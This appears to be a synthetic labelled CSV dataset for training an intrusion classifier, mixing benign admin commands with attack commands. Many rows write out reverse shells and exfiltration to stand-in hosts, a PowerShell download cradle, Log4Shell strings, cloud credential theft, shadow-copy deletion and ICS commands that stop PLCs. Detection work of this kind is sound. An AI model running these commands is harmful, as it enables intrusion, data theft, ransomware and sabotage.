timestamp,src_ip,input,label
2026-01-20T17:46:38.746362,75.131.140.62,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.720628,45.205.81.230,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.715600,123.88.33.57,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.733168,213.45.174.198,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.722168,40.177.238.48,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.693354,150.84.255.151,curl https://google.com,Normal_Business_Ops
2026-01-20T17:46:38.702379,13.230.175.60,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.703359,87.211.215.178,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.687752,214.192.37.84,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.749363,117.156.77.122,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.714423,20.169.60.233,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.703359,129.142.145.39,netstat -tulpn,Normal_Business_Ops
2026-01-20T17:46:38.717597,105.105.142.98,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.697356,197.93.66.136,ps -ef | grep python,Normal_Business_Ops
2026-01-20T17:46:38.692357,164.7.27.8,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.691848,211.74.108.76,uptime,Normal_Business_Ops
2026-01-20T17:46:38.732168,173.158.237.65,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.739701,111.193.39.211,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.693354,21.61.66.39,git add .,Normal_Business_Ops
2026-01-20T17:46:38.745361,175.160.186.106,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.755771,54.232.27.2,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.698355,99.6.30.171,ps -ef | grep python,Normal_Business_Ops
2026-01-20T17:46:38.736168,57.149.43.187,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.729167,166.172.196.182,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.692357,122.22.72.167,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.684749,203.218.180.52,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.746362,172.239.233.248,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.711422,129.176.24.73,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.731167,200.165.90.68,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.735167,55.97.149.239,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.746362,213.146.190.28,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.706916,158.135.129.195,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T17:46:38.731167,191.231.0.71,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.707462,99.182.65.72,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T17:46:38.709422,164.119.7.83,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.704359,99.162.179.184,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.741361,146.56.25.222,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.734167,38.152.39.71,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.705366,205.148.33.204,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.737194,70.177.116.181,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.683749,65.173.189.202,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.727166,24.196.209.136,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.741361,30.252.88.210,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.740386,12.142.91.6,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.737706,206.241.167.128,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.743361,9.192.79.49,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.736168,182.185.215.138,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.751920,127.144.155.67,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.696355,216.138.207.40,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.731167,25.167.195.191,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.715600,22.19.201.228,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.720628,78.14.29.100,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.754419,147.112.119.65,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.736168,64.82.114.166,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.687752,221.165.158.147,npm start,Normal_Business_Ops
2026-01-20T17:46:38.706408,198.144.174.89,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.691848,78.26.97.193,netstat -tulpn,Normal_Business_Ops
2026-01-20T17:46:38.737706,26.147.180.43,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.698355,113.28.94.108,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.722168,39.24.30.220,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.709422,54.193.121.93,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.722168,14.10.178.202,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.739701,133.31.138.128,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.751385,216.124.191.172,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.691257,94.199.121.143,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.692357,14.222.126.98,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.739701,126.251.238.59,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.702379,59.171.14.155,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.733168,45.42.184.145,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.710422,175.14.133.37,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.719650,153.54.209.215,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.744361,196.176.212.22,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.708422,117.103.73.179,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.746362,9.27.34.158,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.694354,130.138.186.249,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.755771,215.215.189.87,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.747362,129.30.12.76,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.754419,144.112.121.39,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.754419,93.120.22.120,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.708422,52.134.53.64,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.695355,62.190.63.233,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T17:46:38.736168,171.116.144.241,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.709422,109.59.193.60,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.730167,126.218.202.114,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.693354,193.151.19.162,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.719650,45.10.159.87,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.690278,71.227.251.92,ps -ef | grep python,Normal_Business_Ops
2026-01-20T17:46:38.717597,201.180.5.15,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.710422,155.230.246.43,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.730167,106.235.75.232,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.728166,14.35.212.128,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.695355,132.209.57.114,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.727166,52.170.194.196,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.706916,100.102.130.6,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.749363,186.228.246.157,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.697356,81.120.76.183,make build,Normal_Business_Ops
2026-01-20T17:46:38.706408,201.28.62.64,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.700357,34.242.192.148,uptime,Normal_Business_Ops
2026-01-20T17:46:38.731167,127.159.237.242,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.751385,218.16.134.253,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.693354,98.57.59.140,whoami,Normal_Business_Ops
2026-01-20T17:46:38.727166,5.10.135.253,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.747362,108.7.28.99,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.690278,184.241.173.74,git branch,Normal_Business_Ops
2026-01-20T17:46:38.721658,193.22.137.217,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.691257,164.144.138.146,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.708422,207.106.12.254,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.704359,5.130.131.27,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.731167,145.38.114.61,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.751385,89.61.54.73,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.725166,73.126.229.157,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.722168,65.197.212.34,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.725166,11.201.69.206,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.711422,131.108.39.98,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.709422,178.163.94.118,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.755771,126.185.251.127,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.694354,163.184.83.191,git add .,Normal_Business_Ops
2026-01-20T17:46:38.712423,57.229.39.140,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.686752,109.208.194.23,git branch,Normal_Business_Ops
2026-01-20T17:46:38.704359,142.255.186.9,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.721658,72.79.175.161,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.702379,115.1.185.68,make build,Normal_Business_Ops
2026-01-20T17:46:38.723165,208.84.191.146,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.688752,152.211.0.10,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.694354,219.193.103.24,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.713423,76.197.83.54,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.701356,43.21.140.33,docker-compose up -d,Normal_Business_Ops
2026-01-20T17:46:38.723165,19.144.25.89,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.712423,90.157.143.114,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.711422,78.250.187.19,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.746362,167.107.169.29,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.714423,70.16.203.54,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.747362,72.111.136.175,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.697356,70.18.44.66,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.683749,178.107.201.83,npm start,Normal_Business_Ops
2026-01-20T17:46:38.724165,1.64.251.184,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.703359,15.253.90.191,git branch,Normal_Business_Ops
2026-01-20T17:46:38.686752,192.199.189.219,npm start,Normal_Business_Ops
2026-01-20T17:46:38.700357,17.180.83.154,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.733168,221.164.185.5,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.704359,66.231.179.134,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T17:46:38.708422,195.18.117.26,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.737706,193.97.147.233,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.731167,40.188.66.155,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.696355,197.131.33.250,npm start,Normal_Business_Ops
2026-01-20T17:46:38.716597,34.125.91.88,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.702379,138.194.163.166,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.747362,175.141.55.103,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.716597,95.97.70.194,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.686752,151.228.83.137,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T17:46:38.685785,186.203.126.253,git add .,Normal_Business_Ops
2026-01-20T17:46:38.731167,150.230.213.112,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.732168,49.91.21.26,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.733168,193.207.126.128,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.709422,135.10.137.158,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.747362,43.204.71.9,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.732168,138.183.159.38,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.733168,99.135.161.214,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.699355,140.169.237.107,uptime,Normal_Business_Ops
2026-01-20T17:46:38.688752,26.29.52.233,docker-compose up -d,Normal_Business_Ops
2026-01-20T17:46:38.735167,57.204.110.93,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.699355,87.6.208.232,make build,Normal_Business_Ops
2026-01-20T17:46:38.694354,173.103.22.102,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.703359,62.174.161.42,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.727166,124.81.167.129,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.747362,25.104.204.109,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.754419,208.31.92.152,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.704359,210.211.251.232,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.694354,153.157.116.135,make build,Normal_Business_Ops
2026-01-20T17:46:38.742361,142.204.247.160,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.683749,217.11.119.91,curl https://google.com,Normal_Business_Ops
2026-01-20T17:46:38.735167,83.63.29.116,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.712423,139.50.157.78,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.709422,190.165.224.59,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.751920,2.22.22.106,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.704359,118.56.171.213,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.693354,26.122.24.9,uptime,Normal_Business_Ops
2026-01-20T17:46:38.717597,63.28.192.125,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.737706,83.162.128.110,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.698355,183.174.193.43,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.744361,38.146.143.22,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.710422,101.91.212.52,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.727166,39.56.59.186,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.715600,191.118.192.129,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.732168,70.9.124.109,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
